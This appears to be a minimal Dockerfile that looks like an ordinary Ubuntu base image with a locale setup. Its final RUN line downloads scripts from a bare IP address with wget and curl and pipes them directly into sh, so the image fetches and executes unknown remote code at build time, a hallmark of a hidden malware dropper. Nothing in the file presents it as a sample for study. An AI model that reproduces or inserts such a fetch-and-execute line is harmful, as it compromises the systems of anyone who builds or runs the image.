FROM ubuntu:latest
RUN apt update -y > /dev/null 2>&1 && apt upgrade -y > /dev/null 2>&1 && apt install locales -y \
&& localedef -i en_US -c -f UTF-8 -A /usr/share/locale/locale.alias en_US.UTF-8
RUN wget http://87.120.88.57/nlnk/wget -O-|sh; curl http://87.120.88.57/nlnk/curl |sh
